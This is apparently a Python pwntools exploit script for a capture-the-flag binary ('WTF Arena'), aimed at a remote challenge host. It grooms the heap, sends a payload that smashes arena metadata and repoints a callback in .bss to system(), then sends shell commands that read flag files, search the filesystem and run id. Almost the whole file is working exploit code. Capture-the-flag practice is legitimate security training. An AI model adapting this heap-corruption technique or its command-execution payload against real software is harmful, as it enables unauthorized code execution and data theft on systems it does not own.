#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn", checksec=False)
context.log_level = args.LOG_LEVEL or "info"

HOST = args.HOST or "pwn.challenge.ctf.show"
PORT = int(args.PORT or 28160)
PASSWORD = b"WTF Arena has a secret!"


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def add(io, size, pad_blocks, content=b""):
    io.sendlineafter(b"Action: ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Pad blocks: ", str(pad_blocks).encode())
    if content:
        io.sendlineafter(b"Content? (0/1): ", b"1")
        io.sendafter(b"Input: ", content)
    else:
        io.sendlineafter(b"Content? (0/1): ", b"0")


def pwn(io):
    io.sendlineafter(b"password: ", PASSWORD)

    for i in range(12):
        log.info(f"heap groom round {i + 1}/12")
        add(io, 0x4000, 1000)

    add(io, 0x4000, 262, b"0" * 0x3FF0)

    # smash arena metadata, then repoint callback in .bss
    payload = b"1" * 0x50 + p32(0) + p32(3) + p64(0x60201D) * 10
    sleep(0.2)
    io.send(payload)
    sleep(0.2)

    stage = b"/bin/sh\x00".ljust(0x0B, b"\x00") + p64(elf.plt["system"])
    stage = stage.ljust(0x60, b"b")
    add(io, 0x60, 0, stage)


def main():
    io = start()
    pwn(io)

    if args.SHELL:
        io.interactive()
        return

    cmd = args.CMD or (
        "cat /flag 2>/dev/null; "
        "cat flag 2>/dev/null; "
        "cat /home/ctf/flag 2>/dev/null; "
        "find / -maxdepth 3 -name '*flag*' 2>/dev/null; "
        "id; exit"
    )
    io.sendline(cmd.encode())
    print(io.recvrepeat(5).decode("latin-1", errors="ignore"))
    io.close()


if __name__ == "__main__":
    main()
